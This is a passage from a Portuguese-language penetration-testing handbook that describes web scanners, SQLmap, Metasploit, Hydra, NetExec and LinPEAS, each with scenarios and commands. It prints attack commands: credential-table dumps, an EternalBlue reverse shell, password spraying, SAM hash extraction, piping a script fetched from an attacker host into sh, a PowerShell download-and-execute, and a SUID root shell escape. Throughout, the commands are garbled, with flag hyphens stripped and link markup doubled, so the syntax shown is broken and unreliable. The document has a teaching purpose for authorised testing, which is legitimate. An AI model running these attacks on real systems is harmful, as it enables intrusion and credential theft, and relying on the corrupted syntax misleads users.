## **3.4 Nikto**

- **Descrição Acadêmica/Técnica:** Desenvolvido em linguagem Perl e fundamentado na biblioteca de rede *LibWhisker*, o Nikto é um *scanner* de código aberto projetado estritamente para a auditoria infraestrutural de servidores HTTP/HTTPS (Camada 7 do modelo OSI). Diferente de ferramentas dinâmicas de análise de aplicação (DAST) que testam o código-fonte da aplicação (buscando falhas de lógica, SQLi ou XSS), o Nikto foca na configuração do *host*. Em baixo nível, ele envia milhares de requisições sequenciais predefinidas, avaliando as respostas do servidor (códigos HTTP, variação no tamanho da resposta e *banners*) contra um banco de dados interno de mais de 6.700 arquivos potencialmente perigosos (ex: install.php, web.config.bak), diretórios padrão ocultos, *scripts* CGI vulneráveis e ausência de cabeçalhos de segurança essenciais (*Security Headers*). Por seu volume massivo e direto de requisições, é uma ferramenta ruidosa, projetada para identificar rapidamente *low-hanging fruits* (falhas de configuração triviais).  
- **Principais Funcionalidades:**  
  - Detecção de indexação de diretórios habilitada (*Directory Listing*) e arquivos de *backup/logs* expostos.  
  - Auditoria rigorosa de cabeçalhos de resposta HTTP (ex: X-Frame-Options, Strict-Transport-Security, Server).  
  - Identificação de instalações legadas ou desatualizadas de sistemas de gerenciamento de conteúdo (CMS) e *frameworks*.  
  - Capacidade de evasão básica de Sistemas de Detecção de Intrusão (IDS) via técnicas de mutação e codificação de URIs (ex: *hex encoding*).  
  - Suporte nativo para roteamento de requisições via *proxies* HTTP e autenticação básica (Basic/NTLM).
- **Sintaxe e Comandos Principais:**  
**Bash**

 Varredura padrão contra a porta HTTP (80) de um domínio ou IP

nikto h [http://alvo.com\]](http://alvo.com\])

 Varredura forçando a comunicação via SSL/TLS (porta 443

nikto h [https://alvo.com\]](https://alvo.com\]) ssl

 Varredura otimizada e direcionada especificamente a arquivos de backup e arquivos miscelâneos

nikto h [http://alvo.com\]](http://alvo.com\]) Tuning 4,b

 Varredura abrangente com exportação estruturada do relatório em formato HTML

nikto h [http://alvo.com\]](http://alvo.com\]) Format htm o relatorioweb.html

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Em um engajamento de *Penetration Testing*, a equipe de infraestrutura do cliente subiu às pressas um servidor web Apache legado (10.0.30.15) para hospedar uma intranet temporária. Antes de tentar explorar os formulários de login da aplicação, o analista decide validar se os administradores deixaram arquivos de configuração críticos, *scripts* de teste do Apache ou páginas de documentação acessíveis na raiz do servidor.  
  - **Comando Executado:**  
  **Bash**

nikto h [http://10.0.30.15](http://10.0.30.15) Tuning 1,2,3,4 Format txt o relatorioniktointranet.txt

- **Resultado Esperado:** O Nikto disparará suas baterias de teste sem evasão. O *output* indicará que o cabeçalho X-XSS-Protection não está definido e revelará a existência de um arquivo /phpinfo.php esquecido na raiz do servidor (expondo variáveis de ambiente e o *path* absoluto do sistema de arquivos). Todas as ocorrências serão salvas e indexadas no arquivo relatorioniktointranet.txt para inclusão como apontamento de baixa/média severidade no relatório executivo.



# **4  Segurança de Aplicações Web e APIs.**

Diferente das fases anteriores, voltadas à infraestrutura e rede, esta seção opera exclusivamente na Camada 7 do modelo OSI. O objetivo tático é a análise dinâmica (DAST) e a exploração lógica da aplicação para identificar vulnerabilidades inerentes ao código (como mapeadas pelo *OWASP Top 10*), incluindo injeções (SQLi, XSS), falhas de controle de acesso, SSRF e quebras de autenticação. 

## **4.1 Burp Suite**

- **Descrição Acadêmica/Técnica:** Desenvolvido pela PortSwigger em Java, o Burp Suite é uma plataforma integrada para testes de segurança em aplicações web, arquitetada em torno de um *proxy* de interceptação *man-in-the-middle* (MITM) que se posiciona entre o navegador do analista e o servidor alvo. Em baixo nível, ele termina a sessão TLS do cliente e estabelece uma nova conexão criptografada com o destino, utilizando um certificado raiz próprio (CA *self-signed*) instalado no navegador para descriptografar e permitir a manipulação em tempo real de requisições e respostas HTTP/HTTPS antes da retransmissão. Sobre essa camada de interceptação, a suíte agrega múltiplos módulos especializados (Repeater, Intruder, Scanner, Sequencer, Decoder), permitindo desde a manipulação manual granular de parâmetros até a automação de ataques de força bruta e a varredura ativa/passiva de vulnerabilidades lógicas.  
- **Principais Funcionalidades:**  
  - Interceptação, suspensão e edição manual de requisições/respostas HTTP em trânsito (módulo *Proxy*).  
  - Reenvio manual e iterativo de requisições isoladas para análise de comportamento da aplicação (módulo *Repeater*).  
  - Automação de ataques de fuzzing e força bruta com múltiplos motores de payload e pontos de inserção customizáveis (módulo *Intruder*).  
  - Motor de varredura automatizada (DAST) para detecção de vulnerabilidades como SQLi, XSS e *command injection* (módulo *Scanner*, restrito à versão *Professional*).  
  - Extensibilidade via *BApp Store* e API em Java/Python (Jython) para desenvolvimento de extensões customizadas.

**Sintaxe e Comandos Principais:** Sendo uma aplicação primariamente gráfica em Java, a interação via terminal no Kali Linux restringe-se à inicialização do processo e à configuração do ambiente:  
**Bash**  
 Inicialização padrão da interface gráfica (versão Community ou Professional)

burpsuite

 Inicialização em modo headless (sem GUI), útil para varreduras automatizadas via linha de comando na versão Professional

java jar caminhoburpsuitepro.jar -project-file=projeto.burp -config-file=config.json -unpause-spider-and-scanner

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Durante uma auditoria de segurança em uma aplicação de *e-commerce*, o analista precisa validar se o fluxo de checkout é vulnerável a manipulação de preços (*price tampering*) ou a *Insecure Direct Object References* (IDOR), alterando o identificador de pedido de outro cliente para visualizar dados sensíveis não autorizados.  
  - **Execução Prática:** O analista configura o navegador para rotear o tráfego pelo *proxy* local (127.0.0.1:8080) do Burp Suite e realiza a navegação normal pela loja até a etapa de finalização de compra. A requisição de confirmação do pedido é capturada na aba *Proxy*, enviada ao *Repeater* (Ctrl+R), e o parâmetro orderid é manualmente alterado para o valor de um pedido pertencente a outro usuário.  
  - **Resultado Esperado:** Caso a aplicação não valide corretamente a propriedade do recurso (falha de *Broken Access Control*), o servidor retornará o código HTTP 200 juntamente com os dados completos do pedido de terceiros (endereço, itens e valores), confirmando a vulnerabilidade de IDOR para inclusão imediata no relatório de risco crítico.



## **4.2 OWASP ZAP (Zed Attack Proxy)**

- **Descrição Acadêmica/Técnica:** O OWASP ZAP é um *proxy* de interceptação e *scanner* de vulnerabilidades de código aberto, desenvolvido em Java sob a governança da fundação OWASP, arquitetado como alternativa livre e totalmente automatizável ao Burp Suite. Em baixo nível, sua operação central também se baseia em um *proxy* MITM com certificado raiz próprio, porém sua arquitetura é fundamentalmente orientada à automação: o ZAP expõe uma API REST completa e um motor de *scripting* (Zest, Python, JavaScript) que permite orquestrar rastreamentos (*spidering*), varreduras ativas e passivas inteiramente via linha de comando ou *pipelines* de CI/CD, sem dependência estrita da interface gráfica. O *Ajax Spider*, baseado no motor de navegação Selenium/HtmlUnit, complementa o rastreamento tradicional ao renderizar e interagir com aplicações que dependem intensamente de JavaScript (*Single Page Applications*).  
- **Principais Funcionalidades:**  
  - Rastreamento automatizado de aplicações web tradicionais (*Traditional Spider*) e SPAs renderizadas em JavaScript (*Ajax Spider*).  
  - Motor de varredura passiva (análise não intrusiva de respostas) e ativa (envio de *payloads* de ataque) para detecção de falhas do *OWASP Top 10*.  
  - API REST nativa completa para orquestração integral de varreduras em *pipelines* DevSecOps sem interação manual.  
  - Modo *Automation Framework* baseado em arquivos YAML declarativos para definição reprodutível de planos de varredura.  
  - Suporte a autenticação complexa (formulários, *scripts*, tokens JWT/OAuth) para varreduras autenticadas em áreas restritas da aplicação.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Inicialização da interface gráfica padrão

zaproxy

 Varredura rápida e automatizada via linha de comando (modo headless), com relatório em HTML

zap.sh cmd quickurl [https://alvo.com\]](https://alvo.com\]) quickout relatoriozap.html

 Execução de um plano declarativo via Automation Framework (YAML), integrável em esteiras CI/CD

zap.sh cmd autorun planoautomacao.yaml

 Inicialização em modo daemon expondo a API REST para orquestração remota

zap.sh daemon host 0.0.0.0 port 8090 config api.key=chaveapi

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Uma equipe de DevSecOps precisa incorporar uma verificação de segurança dinâmica (DAST) automatizada ao *pipeline* de integração contínua, garantindo que nenhuma *build* seja promovida ao ambiente de produção caso vulnerabilidades de severidade alta sejam introduzidas na aplicação ([https://staging.alvo.com](https://staging.alvo.com)), sem exigir intervenção manual de um analista.  
  - **Comando Executado:**  
  **Bash**

zap.sh cmd quickurl [https://staging.alvo.com](https://staging.alvo.com) quickprogress quickout relatoriozapstaging.xml

- **Resultado Esperado:** O ZAP executará em modo *headless* o rastreamento completo da aplicação seguido da varredura ativa padrão, exibindo o progresso percentual em tempo real no terminal (-quickprogress). Ao término, o relatório estruturado em XML será gerado, permitindo que um *script* subsequente na esteira de CI/CD analise a severidade dos achados e determine automaticamente a aprovação ou reprovação (*fail the build*) do *deploy*.



## **4.3 SQLmap**

- **Descrição Acadêmica/Técnica:** O SQLmap é uma ferramenta de exploração automatizada de injeção SQL (SQLi), desenvolvida em Python, projetada para detectar e explorar falhas de sanitização de entrada em camadas de persistência de dados. Em baixo nível, o motor opera através de um extenso conjunto de técnicas de inferência: *Boolean-based blind*, *Error-based*, *UNION query-based*, *Stacked queries* e *Time-based blind*, testando sistematicamente a resposta da aplicação a payloads booleanos e temporizados quando não há retorno direto de dados na tela. Uma vez confirmado o vetor de injeção, a ferramenta é capaz de impressão digital do SGBD (*fingerprinting* via banners e comportamento de funções nativas), enumeração de metadados (bancos, tabelas, colunas) através de consultas SQL cegas reconstruídas byte a byte, e, dependendo dos privilégios do usuário do banco, escalonamento para execução de comandos no sistema operacional subjacente via funcionalidades nativas do SGBD (ex: xpcmdshell no MSSQL).  
- **Principais Funcionalidades:**  
  - Detecção automatizada de múltiplos tipos de injeção SQL (*Boolean, Error, Union, Stacked, Time-based*) em parâmetros GET, POST, *headers* e *cookies*.  
  - Suporte nativo a mais de uma dezena de Sistemas Gerenciadores de Banco de Dados (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, entre outros).  
  - Enumeração completa de metadados do banco (bancos de dados, tabelas, colunas, usuários e privilégios) e extração (*dump*) de dados sensíveis.  
  - Técnicas de evasão de *Web Application Firewalls* (WAF/IPS) via *scripts* de manipulação (*tamper scripts*).  
  - Capacidade de escalonamento para acesso ao sistema de arquivos (leitura/escrita) e execução de comandos no sistema operacional hospedeiro do SGBD.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Teste e identificação inicial de injeção em um parâmetro de URL específico

sqlmap u [http://alvo.com/pagina.php?id=1\]](http://alvo.com/pagina.php?id=1\])

 Varredura a partir de uma requisição HTTP bruta capturada (ex: exportada do Burp Suite), incluindo cookies de sessão

sqlmap r requisicao.txt -batch

 Enumeração de bancos de dados e tabelas após confirmação da injeção

sqlmap u [http://alvo.com/pagina.php?id=1\]](http://alvo.com/pagina.php?id=1\]) -dbs

sqlmap u [http://alvo.com/pagina.php?id=1\]](http://alvo.com/pagina.php?id=1\]) D nomedobanco -tables

 Extração completa (dump) de uma tabela específica com aplicação de scripts de evasão de WAF

sqlmap u [http://alvo.com/pagina.php?id=1\]](http://alvo.com/pagina.php?id=1\]) D banco T tabela -dump -tamper=space2comment

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Durante a auditoria de uma aplicação de portal de notícias, o analista identifica que o parâmetro id na URL de exibição de artigos ([http://alvo.com/noticia.php?id=15](http://alvo.com/noticia.php?id=15)) retorna comportamentos distintos ao ser manipulado com aspas simples, sugerindo uma potencial injeção SQL cega (*blind*). O objetivo é confirmar a falha e extrair a tabela de credenciais administrativas sem interromper a disponibilidade do serviço.  
  - **Comando Executado:**  
  **Bash**

sqlmap u "[http://alvo.com/noticia.php?id=15](http://alvo.com/noticia.php?id=15)" -batch -dbs

sqlmap u "[http://alvo.com/noticia.php?id=15](http://alvo.com/noticia.php?id=15)" D portalnoticias T usuariosadmin -dump

- **Resultado Esperado:** O SQLmap primeiramente confirmará o vetor de injeção (provavelmente do tipo *Time-based blind*), identificará o SGBD como MySQL e listará os bancos de dados disponíveis no servidor. Na segunda execução, a ferramenta reconstruirá byte a byte o conteúdo da tabela usuariosadmin, exibindo em formato tabular no terminal os hashes de senha e nomes de usuário administrativos, prontos para uma tentativa subsequente de quebra offline via Hashcat ou John the Ripper.



## **4.4 ffuf (Fuzz Faster U Fool)**

- **Descrição Acadêmica/Técnica:** O ffuf é uma ferramenta de *fuzzing* web de alto desempenho, escrita em linguagem Go, projetada para a descoberta de conteúdo e a manipulação sistemática de qualquer ponto de uma requisição HTTP através da substituição de uma palavra-chave (FUZZ) por entradas provenientes de uma *wordlist*. Em baixo nível, sua arquitetura aproveita a concorrência nativa do Go (*goroutines*) para disparar um volume massivo de requisições HTTP simultâneas, avaliando as respostas com base em filtros granulares de código de status, tamanho de resposta, contagem de palavras/linhas ou tempo de resposta, permitindo isolar resultados relevantes mesmo em aplicações que retornam página 200 genérica para recursos inexistentes (*soft 404s*). Sua flexibilidade de posicionamento do marcador FUZZ permite aplicá-lo não apenas a diretórios de URL, mas também a parâmetros, *headers*, valores de *cookies* e sub-domínios (*virtual host fuzzing*).  
- **Principais Funcionalidades:**  
  - Descoberta de diretórios, arquivos e *endpoints* de API ocultos através de substituição posicional do marcador FUZZ.  
  - *Fuzzing* de sub-domínios (via manipulação do cabeçalho Host) e de parâmetros GET/POST para identificação de entradas ocultas.  
  - Filtragem e correspondência granular de resultados por código HTTP, tamanho de resposta, contagem de palavras/linhas e latência (-fc, -fs, -mc, -ms).  
  - Suporte a múltiplas *wordlists* simultâneas com marcadores distintos, permitindo combinações complexas (ex: FUZZ1/FUZZ2).  
  - Controle refinado de concorrência (*threads*), *rate limiting* e recursividade automática em diretórios descobertos.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Descoberta básica de diretórios e arquivos utilizando uma wordlist padrão

ffuf w wordlist.txt u [http://alvo.com/FUZZ\]](http://alvo.com/FUZZ\])

 Fuzzing de subdomínios via manipulação do cabeçalho Host, filtrando por tamanho de resposta

ffuf w subdominios.txt u [https://alvo.com\]](https://alvo.com\]) H "Host: FUZZ.alvo.com" fs tamanhoaignorar

 Fuzzing de parâmetros em uma requisição POST, ocultando respostas com código 404

ffuf w parametros.txt u [http://alvo.com/login\]](http://alvo.com/login\]) X POST d "FUZZ=teste" H "Content-Type: application/x-www-form-urlencoded" fc 404

 Descoberta recursiva de diretórios com extensões específicas e múltiplas threads

ffuf w wordlist.txt u [http://alvo.com/FUZZ\]](http://alvo.com/FUZZ\]) e .php,.bak,.zip recursion t 100

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Após identificar que uma aplicação retorna sistematicamente o código HTTP 200 com um corpo de resposta idêntico (tamanho fixo de 3.245 bytes) para qualquer recurso inexistente (*soft 404*), o analista precisa localizar painéis administrativos e arquivos de backup ocultos em [http://alvo.com](http://alvo.com) sem que os falsos positivos poluam a saída.  
  - **Comando Executado:**  
  **Bash**

ffuf w /usr/share/wordlists/dirb/common.txt u [http://alvo.com/FUZZ](http://alvo.com/FUZZ) e .php,.bak fs 3245 t 80 o resultadoffuf.json of json

- **Resultado Esperado:** O ffuf disparará requisições concorrentes (80 *threads*) testando cada entrada da *wordlist* com e sem as extensões especificadas, filtrando ativamente qualquer resposta cujo tamanho seja exatamente 3.245 bytes (o padrão do *soft 404*). O terminal exibirá apenas as ocorrências anômalas e legítimas (ex: /admin.php retornando 200 com tamanho de resposta distinto, ou /backup.zip retornando 403), com os resultados estruturados persistidos no arquivo resultadoffuf.json para posterior análise e inclusão no relatório técnico.



# **5  Exploração de Serviços e Bancos de Dados.**

Esta fase representa o ponto de transição entre a identificação teórica de falhas e a obtenção prática de acesso não autorizado. O objetivo é operacionalizar as vulnerabilidades mapeadas nas fases anteriores através da execução de *exploits*, ataques de injeção e tentativas de autenticação, culminando no comprometimento inicial (*Initial Access*) de um serviço, host ou banco de dados.

## **5.1 Metasploit Framework**

- **Descrição Acadêmica/Técnica:** O Metasploit Framework, mantido pela Rapid7 e desenvolvido primariamente em Ruby, é a plataforma de exploração modular mais consolidada da indústria, estruturando o ciclo completo de um ataque em componentes reutilizáveis e interoperáveis. Em baixo nível, sua arquitetura é dividida em módulos de *exploits* (código que abusa de uma vulnerabilidade específica), *payloads* (a carga útil executada após o sucesso, ex: *reverse shells*), *encoders* (ofuscação de *payloads* para evasão de antivírus/IDS) e *auxiliary* (varreduras e utilitários que não necessariamente concedem acesso). O componente central de pós-exploração, o Meterpreter, é um *payload* avançado que opera inteiramente em memória (*in-memory*, sem tocar o disco), comunicando-se com o atacante através de um canal criptografado e extensível dinamicamente via carregamento de novas funcionalidades (*stagers* e *stages*) sem a necessidade de reconexão.  
- **Principais Funcionalidades:**  
  - Repositório massivo e constantemente atualizado de *exploits* para vulnerabilidades conhecidas (CVEs) em múltiplas plataformas.  
  - Geração de *payloads* customizados e multiplataforma via *msfvenom* (Windows, Linux, Android, macOS, Web).  
  - Meterpreter: *shell* avançado de pós-exploração operando em memória, com suporte a *pivoting*, captura de tela e *keylogging*.  
  - Banco de dados integrado (PostgreSQL) para correlação de *hosts*, serviços e credenciais descobertas entre sessões.  
  - Módulos *auxiliary* para varredura, *fuzzing* e ataques de força bruta sem necessidade de um *exploit* dedicado.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Inicialização da console interativa principal (requer banco de dados ativo)

msfconsole

 Dentro da console: busca, seleção e configuração de um módulo de exploit

search termooucve

use caminho/do/exploit

show options

set RHOSTS IPdoalvo

set LHOST IPdoatacante

set PAYLOAD caminho/do/payload

exploit

 Geração de um payload standalone (reverse shell) via msfvenom para entrega manual

msfvenom p payload LHOST=IPatacante LPORT=porta f formatosaida o arquivosaida

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Durante um *Internal Pentest*, o Nmap identificou que um servidor Windows Server 2008 legado (10.0.5.22) expõe a porta 445 com a assinatura vulnerável ao MS17-010 (EternalBlue). O objetivo é obter execução remota de código e estabelecer uma sessão interativa persistente para iniciar a fase de pós-exploração.  
  - **Comandos Executados:**  
  **Bash**

msfconsole q

use exploit/windows/smb/ms17010eternalblue

set RHOSTS 10.0.5.22

set LHOST 10.0.5.100

set PAYLOAD windows/x64/meterpreter/reversetcp

exploit

- **Resultado Esperado:** O módulo verificará a exploração da falha na pilha SMBv1 do kernel, injetará o *shellcode* correspondente e estabelecerá um *handler* na porta configurada. Ao concluir com sucesso, uma sessão Meterpreter (meterpreter ) será apresentada no terminal, concedendo ao analista execução de comandos com privilégios de SYSTEM diretamente na memória do processo comprometido, sem qualquer gravação em disco.



## **5.2 SearchSploit**

- **Descrição Acadêmica/Técnica:** O SearchSploit é a ferramenta de linha de comando oficial para consulta *offline* ao *Exploit Database* (Exploit-DB), desenvolvida em *shell script* e Python, mantida pela Offensive Security. Em baixo nível, ela opera sobre uma cópia local espelhada (via Git) de todo o repositório de *exploits*, *shellcodes* e artigos técnicos do Exploit-DB, eliminando a dependência de conectividade com a internet durante engajamentos em redes segmentadas ou *air-gapped*. As consultas são processadas através de um índice de metadados estruturado em CSV (filesexploits.csv), permitindo buscas rápidas por título, plataforma, tipo de vulnerabilidade ou identificador CVE, retornando o caminho exato do código-fonte do *exploit* correspondente no sistema de arquivos local para inspeção ou execução imediata.  
- **Principais Funcionalidades:**  
  - Consulta integral e offline ao banco de dados do Exploit-DB, sem exposição de tráfego de busca à internet.  
  - Filtragem granular de resultados por título, CVE, plataforma (Windows, Linux, PHP, etc.) e tipo (*remote, local, webapps, dos*).  
  - Cópia direta (*mirroring*) do código-fonte do *exploit* para o diretório de trabalho atual, facilitando a customização.  
  - Verificação cruzada e correlação com resultados de varreduras do Nmap (via *script* NSE nmap-vulners ou saída XML).

**Sintaxe e Comandos Principais:**  
**Bash**  
 Busca textual simples por um serviço, produto ou versão específica

searchsploit termodebusca

 Busca restrita a um identificador CVE específico

searchsploit -cve numerodocve

 Exibição do código-fonte completo do exploit diretamente no terminal

searchsploit x caminhodoexploit

 Cópia do exploit e de seus arquivos associados (mirror) para o diretório atual

searchsploit m caminhodoexploit

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Após uma varredura com Nmap revelar que um servidor expõe o *ProFTPD* na versão 1.3.5, o analista precisa verificar rapidamente, sem depender de acesso à internet (rede isolada do cliente), se existe um *exploit* público documentado para essa versão específica antes de tentar o desenvolvimento manual de um vetor de ataque.  
  - **Comandos Executados:**  
  **Bash**

searchsploit proftpd 1.3.5

searchsploit m unix/remote/36803.py

- **Resultado Esperado:** O SearchSploit retornará uma listagem tabular incluindo o *exploit* "ProFTPD-1.3.5  Backdoor Command Execution" com seu caminho local correspondente. O segundo comando copiará o *script* Python do *exploit* (36803.py) para o diretório de trabalho atual, permitindo que o analista inspecione o código, ajuste o IP alvo diretamente na variável do *script* e o execute para obter uma *shell* reversa através do *backdoor* introduzido na *build* comprometida do servidor.



## **5.3 Hydra**

- **Descrição Acadêmica/Técnica:** O Hydra (THC-Hydra) é uma ferramenta de ataque de força bruta e dicionário *online*, escrita em C, projetada para testar credenciais de autenticação contra uma vasta gama de protocolos e serviços de rede em tempo real. Em baixo nível, sua arquitetura é fundamentada em *módulos de protocolo* independentes e um núcleo altamente paralelizado baseado em *threads* (pthreads), que estabelece múltiplas conexões TCP/UDP simultâneas contra o serviço alvo, submetendo combinações de usuário/senha e analisando o código de retorno ou a mensagem de resposta do *daemon* (ex: "530 Login incorrect" via FTP, ou o código de status HTTP de um formulário web) para inferir o sucesso ou falha da tentativa. Diferente de ataques *offline* contra hashes, o Hydra interage diretamente com o serviço em produção, tornando-o suscetível a mecanismos de defesa como *rate limiting*, *account lockout* e detecção por IDS/IPS.  
- **Principais Funcionalidades:**  
  - Suporte nativo a mais de 50 protocolos (SSH, FTP, RDP, SMB, HTTP-Form, MySQL, entre outros).  
  - Execução paralela massiva de tentativas de autenticação através de controle granular de *threads* (-t).  
  - Suporte a listas combinadas de usuário/senha (*combo lists*) e geração dinâmica via padrões de caracteres.  
  - Modo de ataque específico para formulários web (http-post-form/http-get-form), com detecção de strings de falha customizadas.  
  - Capacidade de retomada de ataques interrompidos (-R) e controle de *timing* para evasão de bloqueios por tentativas excessivas.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Ataque de dicionário contra um serviço SSH utilizando um usuário fixo e uma wordlist de senhas

hydra l usuario P wordlistsenhas.txt IPdoalvo ssh

 Ataque combinando listas de usuários e senhas contra um serviço FTP, com paralelismo elevado

hydra L usuarios.txt P senhas.txt t 64 IPdoalvo ftp

 Ataque de força bruta contra um formulário de login web (HTTP POST), identificando a string de falha

hydra l usuario P wordlistsenhas.txt alvo.com http-post-form "/login:usuario=^USER^senha=^PASS^:F=Login invalido"

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Durante um *Internal Pentest*, o analista identifica um servidor com o serviço SSH exposto (10.0.5.30) e, através de OSINT prévio, obteve uma lista de nomes de usuários corporativos plausíveis. O objetivo é validar se algum desses usuários utiliza senhas fracas presentes em uma *wordlist* de senhas vazadas conhecidas (rockyou.txt), respeitando um limite de paralelismo para não disparar o bloqueio de conta configurado no *Active Directory*.  
  - **Comando Executado:**  
  **Bash**

hydra L usuarioscorporativos.txt P /usr/share/wordlists/rockyou.txt t 4 f 10.0.5.30 ssh

- **Resultado Esperado:** O Hydra iniciará tentativas sequenciais e controladas (4 *threads* simultâneas) contra o serviço SSH. Assim que uma combinação válida for encontrada, a opção f interromperá imediatamente toda a execução, exibindo no terminal a mensagem "*login: usuario password: senha*", fornecendo credenciais válidas para acesso inicial autenticado ao servidor sem a necessidade de exploração de vulnerabilidades de software.



## **5.4 NetExec (NXC)**

- **Descrição Acadêmica/Técnica:** O NetExec, sucessor direto e mantido ativamente do descontinuado CrackMapExec (CME), é um *framework* de exploração e enumeração pós-comprometimento para ambientes *Active Directory*, desenvolvido em Python. Sua arquitetura é centrada na automação de tarefas administrativas em escala através dos protocolos SMB, WinRM, MSSQL, SSH e LDAP. Em baixo nível, a ferramenta implementa os protocolos de autenticação NTLM e Kerberos de forma nativa (sem depender de binários do sistema como o *smbclient*), permitindo a validação massiva e paralela de credenciais (senhas em texto claro, hashes NTLM ou tíquetes Kerberos) contra centenas de *hosts* simultaneamente. Sua extensibilidade modular embute funcionalidades avançadas de pós-exploração, como a extração remota do banco SAM/LSA, execução de comandos via WMI/SMBExec e coleta de dados para posterior análise de caminhos de ataque no BloodHound.  
- **Principais Funcionalidades:**  
  - Validação massiva e paralela de credenciais (*password spraying*) via SMB, WinRM, LDAP, MSSQL e SSH contra sub-redes inteiras.  
  - Suporte nativo a autenticação *pass-the-hash* (NTLM) e *pass-the-ticket* (Kerberos), sem necessidade de conhecer a senha em texto claro.  
  - Execução remota de comandos arbitrários em *hosts* comprometidos através de múltiplos métodos (WMI, SMBExec, ATExec).  
  - Extração remota de hashes de credenciais armazenadas localmente (SAM) e em cache de domínio (LSA Secrets).  
  - Arquitetura modular extensível (--module) para tarefas específicas, como coleta de dados para o BloodHound ou busca de arquivos sensíveis em compartilhamentos SMB.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Validação de uma única credencial contra um bloco de rede via SMB, identificando hosts com admin local

nxc smb blocoIPouCIDR u usuario p senha

 Ataque de password spraying com uma lista de usuários contra uma única senha, sinalizando sucesso de admin

nxc smb blocoIPouCIDR u usuarios.txt p senhaunica -continue-on-success

 Execução remota de um comando em hosts autenticados com sucesso via SMB

nxc smb IPdoalvo u usuario p senha x comandoaexecutar

 Extração remota do banco de credenciais SAM utilizando hash NTLM (pass-the-hash) em vez da senha

nxc smb IPdoalvo u usuario H hashntlm -sam

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Após a obtenção de uma credencial de usuário de domínio de baixo privilégio através de um ataque de *phishing*, o analista precisa verificar rapidamente em qual dos 200 servidores da rede corporativa (10.0.0.0/24) essa credencial concede privilégios administrativos locais, um passo essencial para identificar o próximo alvo de movimentação lateral.  
  - **Comando Executado:**  
  **Bash**

nxc smb 10.0.0.0/24 u joao.silva p 'Senha@2024' continue-on-success

- **Resultado Esperado:** O NetExec tentará autenticar via SMB em cada *host* vivo da sub-rede simultaneamente. Para cada tentativa bem-sucedida, o terminal exibirá a linha correspondente em verde; caso a credencial também conceda privilégios administrativos locais naquele *host* específico, a ferramenta destacará explicitamente a marcação (Pwn3d) ao lado do resultado, indicando um alvo prioritário e imediato para técnicas de *pass-the-hash* ou execução remota de comandos.



# **6  Pós-Exploração e Escalonamento de Privilégios.**

Uma vez estabelecido o acesso inicial, geralmente restrito a um usuário de baixo privilégio, esta fase concentra-se na enumeração exaustiva do sistema comprometido para identificar vetores de escalonamento (*misconfigurations*, falhas de *kernel*, credenciais em cache) e no *bypass* de mecanismos de controle de acesso, com o objetivo final de obter privilégios administrativos (root/SYSTEM) e mapear a estrutura de confiança do domínio.

## **6.1 PEAS Suite (LinPEAS / WinPEAS)**

- **Descrição Acadêmica/Técnica:** A PEAS Suite (*Privilege Escalation Awesome Scripts*) compreende dois *scripts* de enumeração massiva e automatizada — LinPEAS (Bash, para sistemas Unix-like) e WinPEAS (C/.NET, para sistemas Windows) — projetados para varrer sistematicamente o sistema operacional comprometido em busca de vetores de escalonamento de privilégios. Em baixo nível, os *scripts* não exploram vulnerabilidades diretamente; em vez disso, executam centenas de verificações determinísticas e heurísticas (leitura de permissões de arquivos SUID/SGID, análise de tarefas *cron*/*Scheduled Tasks*, enumeração de capacidades do *kernel*, busca por credenciais em arquivos de configuração e histórico de *shell*, verificação de *binários* com permissões de execução elevadas) e correlacionam os achados com bancos de dados conhecidos de técnicas de escalonamento (como o GTFOBins), destacando os resultados via codificação de cores baseada em probabilidade de exploração (vermelho para altíssima probabilidade).  
- **Principais Funcionalidades:**  
  - Enumeração exaustiva de permissões de sistema de arquivos, capacidades (*capabilities*) e binários SUID/SGID explorávéis (Linux).  
  - Varredura de credenciais em texto claro em arquivos de configuração, históricos de *shell*, variáveis de ambiente e memória de processos.  
  - Identificação de versões de *kernel*/sistema operacional vulneráveis a *exploits* públicos conhecidos.  
  - Análise de tarefas agendadas (*cron jobs*/*Scheduled Tasks*), serviços mal configurados e permissões de registro (WinPEAS).  
  - Saída colorida e priorizada por probabilidade de exploração, facilitando a triagem rápida em ambientes com grande volume de achados.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Transferência do script para a máquina alvo via servidor HTTP temporário (na máquina atacante)

python3 m http.server 8080

 Download e execução direta em memória no alvo comprometido (Linux), sem gravação em disco

curl s [http://IP\_atacante:8080/linpeas.sh\]](http://IP\_atacante:8080/linpeas.sh\]) | sh

 Execução com saída completa redirecionada para arquivo, ignorando etapas demoradas de verificação de CVEs

./linpeas.sh a  saidalinpeas.txt

 Execução do equivalente Windows (via PowerShell) diretamente em memória

powershell c "IEX(New-Object Net.WebClient).DownloadString('http://IPatacante:8080/winPEAS.ps1')"

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Após obter uma *shell* reversa de baixo privilégio (www-data) em um servidor Linux através da exploração de um formulário de *upload* vulnerável, o analista precisa identificar rapidamente um caminho viável para escalonar privilégios até root, dentre as inúmeras possibilidades de má configuração em um sistema de produção real.  
  - **Comando Executado:**  
  **Bash**

curl s [http://10.0.5.100:8080/linpeas.sh](http://10.0.5.100:8080/linpeas.sh) | sh  resultadolinpeas.txt

- **Resultado Esperado:** O *script* executará todas as suas rotinas de verificação, e o terminal exibirá em destaque vermelho (altíssima probabilidade) uma entrada indicando que o binário /usr/bin/find possui a *flag* SUID habilitada. Consultando a referência do GTFOBins apontada no próprio resultado, o analista executará find . exec /bin/sh p  quit, obtendo uma *shell* interativa com privilégios efetivos de root instantaneamente.



## **6.2 Mimikatz**

